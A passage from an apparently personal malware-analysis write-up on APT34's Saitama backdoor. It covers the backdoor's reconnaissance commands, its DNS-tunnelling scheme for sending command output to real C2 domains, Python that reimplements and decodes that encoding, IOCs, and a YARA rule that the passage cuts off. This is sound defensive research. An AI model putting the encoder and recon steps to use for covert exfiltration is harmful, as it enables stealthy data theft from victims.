    <td>  $(ping -n 1 10.65.45.3 | findstr /i ttl) -eq $null;$(ping -n 1 10.65.4.52 | findstr /i ttl) -eq $null;$(ping -n 1 10.65.31.155 | findstr /i ttl) -eq $null;$(ping -n 1 ise-posture.mofagov.gover.local | findstr /i ttl) -eq $null</td>
    <td>Checking if these internal IPs are alive</td>
  </tr>
  <tr>
    <td>20</td>
    <td>PowerShell</td>
    <td> Get-NetIPConfiguration | Foreach IPv4DefaultGateway | Select-Object NextHop</td>
    <td> Gets network configuration, including usable interfaces, IP addresses, and DNS servers.  IPv4DefaultGateway, Gets default gatewayes for all interfaces</td>
  </tr>
  <tr>
    <td>21</td>
    <td>PowerShell</td>
    <td>  Get-DnsClientServerAddress -AddressFamily IPv4 | Select-Object SERVERAddresses</td>
    <td>Gets all DNS server IP addresses associated with the interfaces on the computer only ipv4.</td>
  </tr>
   <tr>
    <td>22</td>
    <td>CMD</td>
    <td> systeminfo | findstr /i \"Domain\"</td>
    <td>Get domain name</td>
  </tr>
  

</table>

<p>The result of the executed command is stored in <code class="language-plaintext highlighter-rouge">resultData</code> and char <code class="language-plaintext highlighter-rouge">=</code> is appended at the first if the data is compressed else char<code class="language-plaintext highlighter-rouge">9</code> ,  then pass it to <code class="language-plaintext highlighter-rouge">ReadySend</code> function which assign the <code class="language-plaintext highlighter-rouge">resultData</code> to <code class="language-plaintext highlighter-rouge">SendData</code>.</p>

<p><a href="/assets/Malware-Analysis/Apt34/25.PNG"><img src="/assets/Malware-Analysis/Apt34/25.PNG" alt="25.PNG" /></a></p>

<p><a href="/assets/Malware-Analysis/Apt34/26.PNG"><img src="/assets/Malware-Analysis/Apt34/26.PNG" alt="26.PNG" /></a></p>

<h2 id="send-state">Send State</h2>

<p>After getting the result from the command execution the malware need a way to send it to the C2.
This is how the malware exfiltrated the data. It may look like a simple DNS request in a network log, but the exfiltrated data is actually built into the DNS request , the malware send 12 bytes at time or less if there is no full 12 bytes to send.</p>

<p>If it’s the first time to send part from the <code class="language-plaintext highlighter-rouge">ResultDate</code> ,
The malware generate different subdomains constructed with the following steps:</p>

<ol>
  <li>Passed data = converted <code class="language-plaintext highlighter-rouge">SendByteIndex</code> to char  and pad it with the first char in <code class="language-plaintext highlighter-rouge">CharDomain</code> + converted <code class="language-plaintext highlighter-rouge">SendDataSize</code> to char and pad it with the first char in <code class="language-plaintext highlighter-rouge">CharDomain</code> + base32 encode of the resultData .</li>
  <li>Convert domaintype to character and + the converted <code class="language-plaintext highlighter-rouge">AgentId</code> to character + data passed.</li>
  <li>Use the counter that was randomly generated  as a seed to MersenneTwister to generate random numbers  and return 36 random char and numbers.</li>
  <li>Map step 1 output to the shuffled chars .</li>
  <li>Convert seed ( counter ) to char  and pad it with the first char in <code class="language-plaintext highlighter-rouge">CharCounter</code>.</li>
  <li>Then append random domain form the 3 that exists  <code class="language-plaintext highlighter-rouge">joexpediagroup.com</code>, <code class="language-plaintext highlighter-rouge">asiaworldremit.com</code>, <code class="language-plaintext highlighter-rouge">uber-asia.com</code></li>
  <li>Generated domain = step 5 output + step 6 output + step 6 output</li>
  <li>The counter is increased if the malware was successfully connected to the generated  domain .</li>
</ol>

<p>If it’s not the first time , the malware generate different subdomains constructed with the following steps:</p>

<ol>
  <li>Passed data = converted <code class="language-plaintext highlighter-rouge">SendByteIndex</code> to char  and pad it with the first char in <code class="language-plaintext highlighter-rouge">CharDomain</code>  + base32 encode of the resultData .</li>
  <li>Convert domaintype to character and + the converted <code class="language-plaintext highlighter-rouge">AgentId</code> to character + data passed.</li>
  <li>Use the counter that was randomly generated  as a seed to MersenneTwister to generate random numbers  and return 36 random char and numbers.</li>
  <li>Map step 1 output to the shuffled chars ..</li>
  <li>Convert seed ( counter ) to char  and pad it with the first char in <code class="language-plaintext highlighter-rouge">CharCounter</code>.</li>
  <li>Then append random domain form the 3 that exists  <code class="language-plaintext highlighter-rouge">joexpediagroup.com</code>, <code class="language-plaintext highlighter-rouge">asiaworldremit.com</code>, <code class="language-plaintext highlighter-rouge">uber-asia.com</code></li>
  <li>Generated domain = step 4 output + step 5 output + step 6 output</li>
  <li>The counter is increased if the malware was successfully connected to the generated domain .</li>
</ol>

<p>If successfully connected to the generated domain , it check if there is data to be received  and if there is still more data to be sent the machine will go to <code class="language-plaintext highlighter-rouge">SendAndReceive</code> state.</p>

<p><a href="/assets/Malware-Analysis/Apt34/29.PNG"><img src="/assets/Malware-Analysis/Apt34/29.PNG" alt="29.PNG" /></a></p>

<p><a href="/assets/Malware-Analysis/Apt34/27.PNG"><img src="/assets/Malware-Analysis/Apt34/27.PNG" alt="27.PNG" /></a></p>

<p><a href="/assets/Malware-Analysis/Apt34/28.PNG"><img src="/assets/Malware-Analysis/Apt34/28.PNG" alt="28.PNG" /></a></p>

<p>For simplicity we consider the data to be send not compressed . The generated subdomain will be like :</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">seed</span> <span class="o">=</span> <span class="mi">6540</span>
<span class="n">AgentID</span>  <span class="o">=</span> <span class="mi">203</span>
<span class="n">SendAndReceive</span> <span class="o">=</span> <span class="mi">1</span> 
<span class="n">SendDataSize</span> <span class="o">=</span> <span class="mi">38</span>
<span class="n">SendByteIndex</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">val</span> <span class="o">=</span> <span class="n">SendDataSize</span> <span class="o">-</span> <span class="n">SendByteIndex</span><span class="p">;</span>
<span class="n">num</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
<span class="n">SendData</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'9We Are Breaking APT34 In This Report!'</span> <span class="c1"># 9 indicates that it's not compressed 
</span><span class="n">SendData</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b32encode</span><span class="p">(</span><span class="n">SendData</span><span class="p">[</span><span class="n">SendByteIndex</span><span class="p">:</span><span class="n">num</span><span class="p">]).</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s">"="</span><span class="p">,</span><span class="sa">b</span><span class="s">""</span><span class="p">).</span><span class="n">lower</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
<span class="n">data</span> <span class="o">=</span>  <span class="n">PadLeft</span><span class="p">(</span><span class="n">ConvertIntToDomain</span><span class="p">(</span><span class="n">SendByteIndex</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="n">CharsDomain</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">PadLeft</span><span class="p">(</span><span class="n">ConvertIntToDomain</span><span class="p">(</span><span class="n">SendDataSize</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="n">CharsDomain</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">SendData</span>
<span class="n">shuffle</span>  <span class="o">=</span> <span class="n">Shuffle</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> 
<span class="n">domain</span> <span class="o">=</span> <span class="n">ConvertIntToDomain</span><span class="p">(</span><span class="n">SendAndReceive</span><span class="p">)</span> <span class="o">+</span> <span class="n">ConvertIntToDomain</span><span class="p">(</span><span class="n">AgentID</span><span class="p">)</span> <span class="o">+</span> <span class="n">data</span>
<span class="n">Domain</span> <span class="o">=</span> <span class="n">MapBaseSubdomainCharacters</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span> <span class="n">shuffle</span><span class="p">)</span> <span class="o">+</span> <span class="n">PadLeft</span><span class="p">(</span><span class="n">ConvertIntToCounter</span><span class="p">(</span><span class="n">seed</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="n">CharsCounter</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="s">"."</span>
<span class="k">print</span><span class="p">(</span><span class="n">Domain</span> <span class="o">+</span> <span class="s">" [ joexpediagroup.com | asiaworldremit.com  | uber-asia.com ]"</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1mcllll1zvmu259z1hxnnlsfnawssgad.
</code></pre></div></div>

<p>If it isn’t the first time to send part of the data . The generated subdomain will be like : :</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">seed</span> <span class="o">=</span> <span class="mi">6541</span>
<span class="n">AgentID</span>  <span class="o">=</span> <span class="mi">203</span>
<span class="n">SendAndReceive</span> <span class="o">=</span> <span class="mi">3</span>
<span class="n">SendDataSize</span> <span class="o">=</span> <span class="mi">38</span>
<span class="n">SendByteIndex</span> <span class="o">=</span> <span class="mi">12</span>  <span class="c1"># send next 12 bytes 
</span><span class="n">val</span> <span class="o">=</span> <span class="n">SendDataSize</span> <span class="o">-</span> <span class="n">SendByteIndex</span><span class="p">;</span>
<span class="n">num</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
<span class="n">SendData</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'9We Are Breaking APT34 In This Report!'</span>
<span class="n">SendData</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b32encode</span><span class="p">(</span><span class="n">SendData</span><span class="p">[</span><span class="n">SendByteIndex</span><span class="p">:</span><span class="n">SendByteIndex</span><span class="o">+</span><span class="n">num</span><span class="p">]).</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s">"="</span><span class="p">,</span><span class="sa">b</span><span class="s">""</span><span class="p">).</span><span class="n">lower</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
<span class="n">data</span> <span class="o">=</span>   <span class="n">PadLeft</span><span class="p">(</span><span class="n">ConvertIntToDomain</span><span class="p">(</span><span class="n">SendDataSize</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="n">CharsDomain</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">SendData</span>
<span class="n">shuffle</span>  <span class="o">=</span> <span class="n">Shuffle</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> 
<span class="n">domain</span> <span class="o">=</span> <span class="n">ConvertIntToDomain</span><span class="p">(</span><span class="n">SendAndReceive</span><span class="p">)</span> <span class="o">+</span> <span class="n">ConvertIntToDomain</span><span class="p">(</span><span class="n">AgentID</span><span class="p">)</span> <span class="o">+</span> <span class="n">data</span>
<span class="n">Domain</span> <span class="o">=</span> <span class="n">MapBaseSubdomainCharacters</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span> <span class="n">shuffle</span><span class="p">)</span> <span class="o">+</span> <span class="n">PadLeft</span><span class="p">(</span><span class="n">ConvertIntToCounter</span><span class="p">(</span><span class="n">seed</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="n">CharsCounter</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="s">"."</span>
<span class="k">print</span><span class="p">(</span><span class="n">Domain</span> <span class="o">+</span> <span class="s">" [ joexpediagroup.com | asiaworldremit.com  | uber-asia.com ]"</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dgxmnu11rfyvvmcgcgcavr6n6wgax.
</code></pre></div></div>

<p>So how the C2 will know what is the data sent ! , Here is a little example demonstrating it .</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Domain</span> <span class="o">=</span> <span class="s">"1mcllll1zvmu259z1hxnnlsfnawssgad"</span> <span class="c1"># the domain generated from the first 12 bytes
</span><span class="n">Seed</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">DomainTypes</span> <span class="o">=</span> <span class="p">{</span>
<span class="s">"a"</span><span class="p">:</span><span class="s">"FirstAlive"</span><span class="p">,</span> 
<span class="s">"b"</span><span class="p">:</span><span class="s">"Send"</span>
<span class="p">,</span><span class="s">"c"</span><span class="p">:</span><span class="s">"Receive"</span>
<span class="p">,</span><span class="s">"d"</span><span class="p">:</span><span class="s">"SendAndReceive"</span> 
<span class="p">,</span><span class="s">"e"</span><span class="p">:</span><span class="s">"MainAlive"</span><span class="p">}</span>

<span class="nb">dict</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">57</span><span class="p">:</span><span class="s">"Not Compressed"</span> <span class="p">,</span> <span class="mi">61</span><span class="p">:</span><span class="s">"Compressed"</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">MapBaseSubdomainCharacters_inverse</span><span class="p">(</span><span class="n">data</span><span class="p">,</span>  <span class="n">shuffle</span><span class="p">):</span>
       <span class="n">text</span> <span class="o">=</span> <span class="s">""</span>
       <span class="n">CharsDomain</span> <span class="o">=</span> <span class="s">"abcdefghijklmnopqrstuvwxyz0123456789"</span>
       <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
            <span class="n">text</span> <span class="o">+=</span> <span class="n">CharsDomain</span><span class="p">[</span><span class="n">shuffle</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">i</span><span class="p">)]</span>
       <span class="k">return</span> <span class="n">text</span>
       
<span class="c1"># Get Seed
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">46656</span><span class="p">):</span>
   <span class="k">if</span> <span class="n">Domain</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">:]</span> <span class="o">==</span> <span class="n">PadLeft</span><span class="p">(</span><span class="n">ConvertIntToCounter</span><span class="p">(</span><span class="n">i</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="n">CharsCounter</span><span class="p">[</span><span class="mi">0</span><span class="p">]):</span>
            <span class="n">Seed</span> <span class="o">=</span> <span class="n">i</span>
            <span class="k">break</span>

<span class="n">shuffle</span> <span class="o">=</span> <span class="n">Shuffle</span><span class="p">(</span><span class="n">Seed</span><span class="p">)</span> 

<span class="n">Domain_Inv</span> <span class="o">=</span> <span class="n">MapBaseSubdomainCharacters_inverse</span><span class="p">(</span><span class="n">Domain</span><span class="p">[:</span><span class="o">-</span><span class="mi">3</span><span class="p">],</span><span class="n">shuffle</span><span class="p">)</span>
<span class="n">domaintype</span> <span class="o">=</span> <span class="n">Domain_Inv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> 
<span class="n">data</span> <span class="o">=</span> <span class="n">Domain_Inv</span><span class="p">[</span><span class="o">-</span><span class="mi">20</span><span class="p">:]</span>

<span class="c1"># for the frist connection we know SendByteIndex will be 0 which is equal to aaa after converting it to char and pad it
</span><span class="n">SendByteIndex_offset</span> <span class="o">=</span> <span class="n">Domain_Inv</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"aaa"</span><span class="p">)</span>

<span class="n">AgentId</span> <span class="o">=</span> <span class="n">Domain_Inv</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="n">SendByteIndex_offset</span><span class="p">]</span>
<span class="n">DataSize</span> <span class="o">=</span> <span class="n">Domain_Inv</span><span class="p">[</span><span class="n">SendByteIndex_offset</span><span class="o">+</span><span class="mi">3</span><span class="p">:</span><span class="n">SendByteIndex_offset</span><span class="o">+</span><span class="mi">6</span><span class="p">]</span>

<span class="c1"># Get AgentId
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">255</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">AgentId</span> <span class="o">==</span> <span class="n">ConvertIntToDomain</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
      <span class="n">AgentId</span> <span class="o">=</span>  <span class="n">i</span>
      <span class="k">break</span>
        
<span class="c1"># Get DataSize
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">255</span><span class="p">):</span> <span class="c1"># size can exceed 255 of course 
</span>    <span class="k">if</span> <span class="n">DataSize</span> <span class="o">==</span>  <span class="n">PadLeft</span><span class="p">(</span><span class="n">ConvertIntToDomain</span><span class="p">(</span><span class="n">i</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="n">CharsDomain</span><span class="p">[</span><span class="mi">0</span><span class="p">]):</span>
      <span class="n">DataSize</span> <span class="o">=</span>  <span class="n">i</span>
      <span class="k">break</span>
        
<span class="c1"># pad and decode data
</span><span class="n">Data</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b32decode</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">upper</span><span class="p">()</span><span class="o">+</span><span class="s">"="</span><span class="o">*</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">%</span><span class="mi">8</span><span class="p">))</span>     

<span class="k">print</span><span class="p">(</span><span class="s">"Seed :"</span><span class="p">,</span> <span class="n">Seed</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"AgentId :"</span> <span class="p">,</span><span class="n">AgentId</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Domain Type :"</span> <span class="p">,</span> <span class="n">DomainTypes</span><span class="p">[</span><span class="n">domaintype</span><span class="p">])</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Size :"</span> <span class="p">,</span><span class="n">DataSize</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Send Data :"</span> <span class="p">,</span><span class="n">Data</span><span class="p">[</span><span class="mi">1</span><span class="p">::])</span>
<span class="k">print</span><span class="p">(</span><span class="nb">dict</span><span class="p">[</span><span class="n">Data</span><span class="p">[</span><span class="mi">0</span><span class="p">]])</span>


</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Seed : 6540
AgentId : 203
Domain Type : Send
Size : 38
Send Data : b'We Are Brea'
Not Compressed
</code></pre></div></div>

<h2 id="receive-and-send-state">Receive and Send state</h2>
<p>The malware generate different subdomains constructed with the following steps:</p>
<ol>
  <li>Passed data =  converted <code class="language-plaintext highlighter-rouge">SendByteIndex</code> to char  and pad it with the first char in <code class="language-plaintext highlighter-rouge">CharDomain</code> + converted <code class="language-plaintext highlighter-rouge">ReceiveByteIndex</code> to char  and pad it with the first char in <code class="language-plaintext highlighter-rouge">CharDomain</code> + base32 encode of the resultData .</li>
  <li>Convert domaintype to character and + the converted <code class="language-plaintext highlighter-rouge">AgentId</code> to character + data passed.</li>
  <li>Use the counter that was randomly generated  as a seed to MersenneTwister to generate random numbers  and return 36 random char and numbers.</li>
  <li>Map step 1 output to the shuffled chars .</li>
  <li>Convert seed ( counter ) to char  and pad it with the first char in <code class="language-plaintext highlighter-rouge">CharCounter</code>.</li>
  <li>Then append random domain form the 3 that exists  <code class="language-plaintext highlighter-rouge">joexpediagroup.com</code>, <code class="language-plaintext highlighter-rouge">asiaworldremit.com</code>, <code class="language-plaintext highlighter-rouge">uber-asia.com</code></li>
  <li>Generated domain = step 4 output + step 5 output + step 6 output</li>
  <li>The counter is increased if the malware was successfully connected to the generated domain .</li>
</ol>

<p>Then process data as seen in <code class="language-plaintext highlighter-rouge">Receive</code> function and check if all the data was sent or their are more to send .
and then it go to <code class="language-plaintext highlighter-rouge">Send</code> state or <code class="language-plaintext highlighter-rouge">Receive</code> state or <code class="language-plaintext highlighter-rouge">Do</code> state depends on the check made.</p>

<p><a href="/assets/Malware-Analysis/Apt34/31.PNG"><img src="/assets/Malware-Analysis/Apt34/31.PNG" alt="31.PNG" /></a></p>

<p><a href="/assets/Malware-Analysis/Apt34/32.PNG"><img src="/assets/Malware-Analysis/Apt34/32.PNG" alt="32.PNG" /></a></p>

<p>Let’s consider that there was data to be received after sending the first 12 bytes , so state will change from <code class="language-plaintext highlighter-rouge">Send</code> to  <code class="language-plaintext highlighter-rouge">ReceiveandSend</code> state . And here is how the domain will be generated:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">seed</span> <span class="o">=</span> <span class="mi">6541</span>
<span class="n">AgentID</span>  <span class="o">=</span> <span class="mi">203</span>
<span class="n">SendAndReceive</span> <span class="o">=</span> <span class="mi">3</span>
<span class="n">SendDataSize</span> <span class="o">=</span> <span class="mi">38</span>
<span class="n">SendByteIndex</span> <span class="o">=</span> <span class="mi">12</span> 
<span class="n">ReceiveByteIndex</span> <span class="o">=</span> <span class="mi">0</span> 
<span class="n">val</span> <span class="o">=</span> <span class="n">SendDataSize</span> <span class="o">-</span> <span class="n">SendByteIndex</span><span class="p">;</span>
<span class="n">num</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
<span class="n">SendData</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'9We Are Breaking APT34 In This Report!'</span>
<span class="n">SendData</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b32encode</span><span class="p">(</span><span class="n">SendData</span><span class="p">[</span><span class="n">SendByteIndex</span><span class="p">:</span><span class="n">SendByteIndex</span><span class="o">+</span><span class="n">num</span><span class="p">]).</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s">"="</span><span class="p">,</span><span class="sa">b</span><span class="s">""</span><span class="p">).</span><span class="n">lower</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
<span class="n">data</span> <span class="o">=</span>  <span class="n">PadLeft</span><span class="p">(</span><span class="n">ConvertIntToDomain</span><span class="p">(</span><span class="n">SendByteIndex</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="n">CharsDomain</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">PadLeft</span><span class="p">(</span><span class="n">ConvertIntToDomain</span><span class="p">(</span><span class="n">ReceiveByteIndex</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="n">CharsDomain</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">SendData</span>
<span class="n">shuffle</span>  <span class="o">=</span> <span class="n">Shuffle</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> 
<span class="n">domain</span> <span class="o">=</span> <span class="n">ConvertIntToDomain</span><span class="p">(</span><span class="n">SendAndReceive</span><span class="p">)</span> <span class="o">+</span> <span class="n">ConvertIntToDomain</span><span class="p">(</span><span class="n">AgentID</span><span class="p">)</span> <span class="o">+</span> <span class="n">data</span>
<span class="n">Domain</span> <span class="o">=</span> <span class="n">MapBaseSubdomainCharacters</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span> <span class="n">shuffle</span><span class="p">)</span> <span class="o">+</span> <span class="n">PadLeft</span><span class="p">(</span><span class="n">ConvertIntToCounter</span><span class="p">(</span><span class="n">seed</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="n">CharsCounter</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="s">"."</span>
<span class="k">print</span><span class="p">(</span><span class="n">Domain</span> <span class="o">+</span> <span class="s">" [ joexpediagroup.com | asiaworldremit.com  | uber-asia.com ]"</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dgxmmammm11rfyvvmcgcgcavr6n6wgax. [ joexpediagroup.com | asiaworldremit.com  | uber-asia.com ]
</code></pre></div></div>

<h2 id="final-recap">Final Recap</h2>

<ol>
  <li>Mutex  created .</li>
  <li>Machine States dictionary create which control the states transaction , and every state do different job .</li>
  <li>Config initialized .</li>
  <li>First state is <code class="language-plaintext highlighter-rouge">Begin</code> and a command <code class="language-plaintext highlighter-rouge">Start </code>changes state to <code class="language-plaintext highlighter-rouge">Alive</code>.</li>
  <li>Try to call <code class="language-plaintext highlighter-rouge">FirstAlive</code> untill it succeed or exceed maximum tries , set <code class="language-plaintext highlighter-rouge">AgentId</code> if succeed.</li>
  <li><code class="language-plaintext highlighter-rouge">MainAlive</code> is called and check if data will be received  move to <code class="language-plaintext highlighter-rouge">Receive</code> state.</li>
  <li><code class="language-plaintext highlighter-rouge">Receive</code> state receive the command  to be executed then move to <code class="language-plaintext highlighter-rouge">Do</code> state .</li>
  <li><code class="language-plaintext highlighter-rouge">Do</code> state will execute the specified command, and the result will be sent to the C2 so the malware will move to <code class="language-plaintext highlighter-rouge">Send</code> state.</li>
  <li><code class="language-plaintext highlighter-rouge">Send</code> state will send the result of the executed command , and check if there is more data that will be received , if found and the data being sent wasn’t fully sent yet , the malware move to <code class="language-plaintext highlighter-rouge">ReceiveandSend</code> state.</li>
</ol>

<p>Saitama  abuses the DNS protocol for its C2 communications. This is stealthier than other communication methods. Also  uses techniques such as compression and long random sleep times to disguise malicious traffic in between legitimate traffic.</p>

<h1 id="iocs">IOCs</h1>

<ul>
  <li>Hashes:</li>
</ul>

<ol>
  <li>
    <p>Maldoc (Confirmation Receive Document.xls) :</p>

    <p>md5 : <code class="language-plaintext highlighter-rouge">C4F81486D10818E0BD4B9701DCAFC8A2</code></p>

    <p>sha1 : <code class="language-plaintext highlighter-rouge">15A1B1EBF04870AAD7EA4BD7D0264F17057E9002</code></p>

    <p>sha256 : <code class="language-plaintext highlighter-rouge">26884F872F4FAE13DA21FA2A24C24E963EE1EB66DA47E270246D6D9DC7204C2B</code></p>

    <p>ssdeep : <code class="language-plaintext highlighter-rouge">12288:NfjOjlJUDo0DcsUD65oNxWqUOsDmlYh5edDxcSjrUlCZiJxIlxSLaMpgA0DfZT5r:VOjlJKrqUKEIlxSLh0Djme</code></p>
  </li>
  <li>
    <p>update.exe (Saitama backdoor) :</p>

    <p>md5 : <code class="language-plaintext highlighter-rouge">79C7219BA38C5A1971A32B50E14D4A13</code></p>

    <p>sha1 : <code class="language-plaintext highlighter-rouge">B39B3A778F0C257E58C0E7F851D10C707FBE2666</code></p>

    <p>sha256 : <code class="language-plaintext highlighter-rouge">E0872958B8D3824089E5E1CFAB03D9D98D22B9BCB294463818D721380075A52D</code></p>

    <p>imphash : <code class="language-plaintext highlighter-rouge">F34D5F2D4577ED6D9CEEC516C1F5A744</code></p>

    <p>ssdeep : <code class="language-plaintext highlighter-rouge">768:bEj9FSWZxm3eJ38Etub7B/iGkIJywnYwVMwfJhVRVmHUFeP+SVL/mVW5iV7uVSxH:gaSLub7W8</code></p>
  </li>
  <li>
    <p>Microsoft.Exchange.WebServices.dll:</p>

    <p>md5 : <code class="language-plaintext highlighter-rouge">F9A1B01E2D5C4CB2D632A74FCB7EC2DD</code></p>

    <p>sha1 : <code class="language-plaintext highlighter-rouge">5A9B17A0510301725DCEAFFF026ECA872FB05579</code></p>

    <p>sha256 : <code class="language-plaintext highlighter-rouge">7EBBEB2A25DA1B09A98E1A373C78486ED2C5A7F2A16EEC63E576C99EFE0C7A49</code></p>

    <p>imphash : <code class="language-plaintext highlighter-rouge">DAE02F32A21E03CE65412F6E56942DAA</code></p>

    <p>ssdeep : <code class="language-plaintext highlighter-rouge">12288:m/uKlFauqcCJ781wrckIE/9dCuyk05CGCIYzmA/VMmy5PJ+S:m/uKlFaFV8EdCuyk05CDdzPry5PJ1</code></p>
  </li>
  <li>
    <p>update.exe.config:</p>

    <p>md5 : <code class="language-plaintext highlighter-rouge">AFDC68F0B6CE87EBEF0FEC5565C80FD3</code></p>

    <p>sha1 : <code class="language-plaintext highlighter-rouge">2641A3CC98AA84979BE68B675E26E5F94F059B57</code></p>

    <p>sha256 : <code class="language-plaintext highlighter-rouge">09C19455F249514020A4075667B087B16EAAD440938F2D139399D21117879E60</code></p>

    <p>ssdeep : <code class="language-plaintext highlighter-rouge">3:JLWMNHU8LdgCQcIMOoIRuQVK/FNURAmIRMNHNQAolFNURAmIRMNHjFN5KWREBAWq:JiMVBd1IffVKNC7VNQAofC7VrpuAW4QA</code></p>
  </li>
</ol>

<ul>
  <li>
    <p>Mutex : <code class="language-plaintext highlighter-rouge">726a06ad-475b-4bc6-8466-f08960595f1e</code></p>
  </li>
  <li>Files:
    <ol>
      <li>C:\Users\UserName\AppData\Local\MicrosoftUpdate\Microsoft.Exchange.WebServices.dll</li>
      <li>C:\Users\UserName\AppData\Local\MicrosoftUpdate\update.exe.config</li>
      <li>C:\Users\UserName\AppData\Local\MicrosoftUpdate\update.exe</li>
    </ol>
  </li>
  <li>C2 Domains:
    <ol>
      <li>uber-asia.com</li>
      <li>asiaworldremit.com</li>
      <li>joexpediagroup.com</li>
    </ol>
  </li>
</ul>

<h1 id="yara-rules">Yara Rules</h1>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rule</span> <span class="n">APT34_Saitama_Agent</span><span class="p">:</span> <span class="n">APT34_Saitama_Agent</span>
<span class="p">{</span>
    <span class="n">meta</span><span class="p">:</span>
        <span class="n">Author</span> <span class="o">=</span> <span class="s">"X__Junior"</span>
        <span class="n">Description</span> <span class="o">=</span> <span class="s">"APT34_Saitama_Agent Detection"</span>


    <span class="n">strings</span><span class="p">:</span>
	<span class="err">$</span><span class="n">GetRandomRange</span> <span class="o">=</span> <span class="p">{</span><span class="mi">04</span> <span class="mi">03</span> <span class="mi">59</span> <span class="mi">0</span><span class="n">A</span> <span class="mi">02</span> <span class="mi">28</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="mi">0</span><span class="n">B</span> <span class="mi">03</span> <span class="mi">6</span><span class="n">A</span> <span class="mi">07</span> <span class="mi">6</span><span class="n">E</span> <span class="mi">06</span> <span class="mi">6</span><span class="n">A</span> <span class="mi">5</span><span class="n">D</span> <span class="mi">58</span> <span class="mi">69</span> <span class="mi">2</span><span class="n">A</span><span class="p">}</span>
